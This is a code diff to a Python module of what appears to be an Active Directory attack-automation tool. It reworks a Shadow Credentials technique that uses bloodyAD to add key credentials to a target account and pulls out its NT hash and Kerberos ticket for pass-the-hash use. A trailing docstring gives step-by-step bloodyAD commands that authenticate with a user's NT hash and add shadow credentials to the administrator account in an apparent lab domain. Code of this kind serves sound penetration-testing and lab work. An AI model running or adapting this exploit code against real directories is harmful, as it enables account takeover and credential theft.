@@ -1,10 +1,12 @@
 # services/ldap_techniques.py
-from services.printing import print_done
+from services.printing import print_done, print_info, print_warning
 from entities.exploit_result import ExploitResult
 from entities.credentials import Credential
 from exceptions.hop_failed_error import HopFailedError
 from strategies.bloodyad_base import HARDCODED_PASSWORD
+from utils.runner import SHADOW_CREDS_DIR
 
+import os
 import re
 
 class ADTechniquesMixin:
@@ -167,64 +169,117 @@ class ADTechniquesMixin:
     # 7. Shadow Credentials
     # ──────────────────────────────────────────────────
     def _do_shadow_credentials(self, creds: dict) -> ExploitResult:
-        try:
-            target_sam = self.target.sam()
+        target_sam = self.target.sam()
 
+        # Ensure tmp dir exists
+        os.makedirs(SHADOW_CREDS_DIR, exist_ok=True)
+
+        try:
+            # Run bloodyAD with cwd=SHADOW_CREDS_DIR
+            # so PFX is saved there directly
             output = self._run_bloodyad(
                 creds,
                 ["add", "shadowCredentials", target_sam],
-                "ShadowCredentials"
+                "ShadowCredentials",
+                cwd=SHADOW_CREDS_DIR        # ← PFX lands here
             )
+        except HopFailedError as e:
+            error_msg = str(e)
+            if "PKINIT" in error_msg or "PADATA_TYPE_NOSUPP" in error_msg:
+                # Clean AD
+                try:
+                    self._run_bloodyad(
+                        creds,
+                        ["remove", "shadowCredentials", target_sam],
+                        "ShadowCredentials cleanup",
+                        cwd=SHADOW_CREDS_DIR
+                    )
+                except Exception:
+                    pass
 
-            parsed = self._parse_shadow_credentials_output(output)
-            nt_hash = parsed.get("nt_hash","")
-            ccache = parsed.get("ccache","")
+                # Clean local PFX — exact file from output
+                self._cleanup_pfx_file(error_msg, SHADOW_CREDS_DIR)
 
-            if not nt_hash and not ccache:
-                raise HopFailedError(
-                    "ShadowCredentials",
-                    "bloodyAD ran but could not parse NT hash or ccache from output"
-                )
-
-            print_done(f"Shadow Credentials set on {target_sam} → NT: {nt_hash}")
-            return ExploitResult(
-                technique="ShadowCredentials",
-                edge=self.edge,
-                success=True,
-                notes=(
-                    f"Shadow credentials added to {target_sam}\n"
-                    f"Username : {target_sam}\n"
-                    f"NT Hash  : {nt_hash}\n"
-                    f"TGT      : {ccache}\n"
-                    f"Domain   : {creds['domain']}"
-                ),
-                gained_access=Credential(
-                    username=target_sam,
-                    hash=f":{nt_hash}",   # :hash format for pass-the-hash tools
-                    ticket=ccache,        # ccache path for Kerberos tools
-                    domain=creds.get("domain"),
-                    dc_ip=creds.get("dc_ip"),
-                ),
-            )
-        except HopFailedError as e: # ShadowCredentials requires PKINIT support
-            if "PKINIT" in str(e) or "PADATA_TYPE_NOSUPP" in str(e):
                 raise HopFailedError(
                     self.edge,
-                    "ShadowCredentials requires ADCS/PKINIT — not available on this DC"
+                    "ShadowCredentials: no PKINIT support (no CA enrolled). "
+                    "Cleanup done."
                 )
             raise
-    
-    def _parse_shadow_credentials_output(self, output: str) -> dict:
-        result = {}
-        
-        # NT hash: "NT: 9029cf007326107eb1c519c84ea60dbe"
-        nt_match = re.search(r"NT:\s*([a-fA-F0-9]{32})", output)
-        if nt_match:
-            result["nt_hash"] = nt_match.group(1)
-        
-        # ccache path: "TGT stored in ccache file robert.baratheon_WS.ccache"
-        ccache_match = re.search(r"TGT stored in ccache file (.+\.ccache)", output)
-        if ccache_match:
-            result["ccache"] = ccache_match.group(1).strip()
-        
-        return result
+
+        parsed = self._parse_shadow_credentials_output(output)
+        nt_hash = parsed.get("nt_hash", "")
+        ccache = parsed.get("ccache", "")
+
+        if not nt_hash and not ccache:
+            self._cleanup_pfx_file(output, SHADOW_CREDS_DIR)
+            raise HopFailedError(
+                self.edge,
+                "bloodyAD ran but could not parse NT hash or ccache"
+            )
+
+        # ccache is also in SHADOW_CREDS_DIR now
+        ccache_path = os.path.join(SHADOW_CREDS_DIR, ccache)
+
+        print_done(f"Shadow Credentials set on {target_sam} → NT: {nt_hash}")
+        return ExploitResult(
+            technique="ShadowCredentials",
+            edge=self.edge,
+            success=True,
+            notes=(
+                f"Shadow credentials added to {target_sam}\n"
+                f"Username : {target_sam}\n"
+                f"NT Hash  : {nt_hash}\n"
+                f"TGT      : {ccache_path}\n"
+                f"Domain   : {creds['domain']}"
+            ),
+            gained_access=Credential(
+                username=target_sam,
+                hash=f":{nt_hash}",
+                ticket=ccache_path,
+                domain=creds.get("domain"),
+                dc_ip=creds.get("dc_ip"),
+            ),
+        )
+
+    def _cleanup_pfx_file(self, output: str, directory: str):
+        """Remove only the specific PFX file from THIS attempt."""
+        match = re.search(r"PFX certificate saved at:\s*(\S+\.pfx)", output)
+        if match:
+            pfx_name = os.path.basename(match.group(1))
+            pfx_path = os.path.join(directory, pfx_name)
+            if os.path.exists(pfx_path):
+                try:
+                    os.remove(pfx_path)
+                    print_info(f"Cleaned up {pfx_path}")
+                except OSError as e:
+                    print_warning(f"Could not delete {pfx_path}: {e}")
+            else:
+                print_warning(f"PFX not found at expected path: {pfx_path}")
+"""
+# Quick check for ADCS in your domain
+bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
+  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
+  get object "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=sevenkingdoms,DC=local"
+
+# Step 1: See what's on administrator's msDS-KeyCredentialLink
+bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
+  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
+  get object administrator --attr msDS-KeyCredentialLink
+
+# Step 2: Clean up ALL shadow credentials from previous tests
+bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
+  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
+  remove shadowCredentials administrator
+
+# Step 3: Verify it's clean
+bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
+  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
+  get object administrator --attr msDS-KeyCredentialLink
+
+# Step 4: Try shadow credentials fresh, watch carefully
+bloodyAD --host 192.168.56.10 -d sevenkingdoms.local \
+  -u lord.varys -p ':52ff2a79823d81d6a3f4f8261d7acc59' \
+  add shadowCredentials administrator
+
+"""
